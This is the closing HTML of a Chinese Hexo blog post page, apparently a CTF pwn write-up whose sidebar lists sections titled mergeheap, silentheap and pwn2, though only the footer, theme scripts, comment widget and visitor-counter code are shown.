+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mergeheap"><span class="nav-number">1.</span> <span class="nav-text">mergeheap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#silentheap"><span class="nav-number">2.</span> <span class="nav-text">silentheap</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn2"><span class="nav-number">3.</span> <span class="nav-text">pwn2</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D4rk3r</span>
+
+  
+</div>
+
+
+<span id="busuanzi_container_site_pv">本站访客数:<span id="busuanzi_value_site_uv"></span></span>
+
+
+
+
+<div class="powered-by">
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共66k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz',
+        appKey: '5zQS6AJMU15VfzcEXr0cw0cr',
+        placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("P8YQNN3bnD7UXTifnqgfGuuQ-gzGzoHsz", "5zQS6AJMU15VfzcEXr0cw0cr");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
